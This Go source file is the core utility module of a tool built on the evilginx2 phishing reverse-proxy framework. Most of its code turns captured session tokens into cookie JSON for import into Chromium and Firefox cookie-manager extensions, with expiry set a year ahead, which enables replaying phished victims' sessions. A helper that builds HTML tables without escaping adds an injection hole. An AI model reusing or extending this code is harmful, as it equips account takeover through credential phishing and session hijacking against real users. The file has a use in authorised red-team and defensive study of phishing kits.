package core

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/json"
	"fmt"
	"os"
	"time"
	"strconv"

    "github.com/shirou/gopsutil/disk"
    "github.com/shirou/gopsutil/host"

	"github.com/kgretzky/evilginx2/database"
)

func GenRandomToken() string {
	rdata := make([]byte, 64)
	rand.Read(rdata)
	hash := sha256.Sum256(rdata)
	token := fmt.Sprintf("%x", hash)
	return token
}

func GenRandomString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func GenRandomAlphanumString(n int) string {
	const lb = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		t := make([]byte, 1)
		rand.Read(t)
		b[i] = lb[int(t[0])%len(lb)]
	}
	return string(b)
}

func CreateDir(path string, perm os.FileMode) error {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		err = os.Mkdir(path, perm)
		if err != nil {
			return err
		}
	}
	return nil
}

//this function is supposed to be a helper for tokenToCookie, but right now there is type confusion, so it goes basically unused
/**
func tokensToJSON(tokens map[string]map[string]*database.Token, cookies []*Cookie) []*Cookie {
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	return cookies
}
**/

func tokensToCookieChromium(tokens map[string]map[string]*database.Token) string {
	//this function probably exports as a EditThisCookie json https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=de

	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = domain[1:]
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}

func tokensToCookieFf(tokens map[string]map[string]*database.Token) string {
	//this function is very similar to tokenToJSON, but it is intended for https://github.com/ysard/cookie-quick-manager/

	type Cookie struct {
		Domain         string `json:"Host raw"`
		Name           string `json:"Name raw"`
		Path           string `json:"Path raw"`
		Value          string `json:"Content raw"`
		ExpirationDate int64  `json:"Expires raw"`
		HttpOnly       bool   `json:"httpOnly,omitempty"`
		HostOnly       bool   `json:"hostOnly,omitempty"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
			}
			if domain[:1] == "." {
				c.HostOnly = false
				c.Domain = "https://" + domain[1:] + "/"
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}

func tokensToCookie(tokens map[string]map[string]*database.Token, browser string) string {
	if browser == "Ff" {
		return tokensToCookieFf(tokens)
	} else if browser == "Chromium" {
		return tokensToCookieChromium(tokens)
	} else {
		panic("Invalid Browser")
		return ""
	}
}

func AsHTMLTable(header []string, table [][]string) string {
	var html string

	//new table
	html = "<table>"
	//headers
	html = html + "<tr>"
	for _, element := range header {
		html = html + "<th>" + element + "</th>"
	}
	html = html + "</tr>"
	//content
	for _, row := range table {
		html = html + "<tr>"
		for _, rowelement := range row {
			html = html + "<td>" + rowelement + "</td>"
		}
		html = html + "</tr>"
	}
	html = html + "</table>"
	
	return(html)
}

// gets some information about the current system status
func getStatus() string {
	var r string

	r = "Current time: " + time.Now().String()
	hostinfo, _ := host.Info()
	r = r + "\nHostname: " + hostinfo.Hostname
	diskusage, _ := disk.Usage("/")
	r = r + "\nDisk Free: " + strconv.FormatUint(diskusage.Free/1024/1024, 10) + "MB"

	return(r)
}
